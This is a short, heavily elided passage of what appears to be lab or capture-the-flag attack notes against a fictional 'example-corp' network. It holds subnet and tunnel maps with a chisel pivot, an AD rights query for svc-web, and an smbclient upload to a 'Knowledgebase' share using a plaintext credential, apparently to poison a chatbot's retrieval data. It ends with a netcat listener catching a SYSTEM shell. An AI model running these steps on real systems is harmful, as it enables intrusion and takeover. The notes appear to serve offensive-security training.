...
|------|--------|-----------|
| External | 192.168.50.60 | db-host (MSSQL/chatbot entry) |
| DMZ | 172.16.50.0/24 | web-host, dc-host, jump-host |
| DEV | 10.1.50.0/24 | CLIENT01/02, db01.dev, gitlab01 |
| INTERNAL | 10.80.50.0/24 | dc-host(30), FILESERVER01(31), CLIENT03(35), CLIENT04(36) |

## Tunnel Map
| Port | Route | Via |
|------|-------|-----|
| 1080 (default) | DMZ pivot | chisel on db-host |
...
$group.ObjectSecurity.Access | ? { $_.IdentityReference -match "svc-web" } | ft ActiveDirectoryRights, IdentityReference
...
```bash
# Upload
smbclient '//10.80.50.31/Knowledgebase' -U 'example-corp/rag_kb%Corrupt44!Plow' \
...
rlwrap nc -nlvp 5985
# Shell as example-corp\CLIENT04$ (SYSTEM)
```
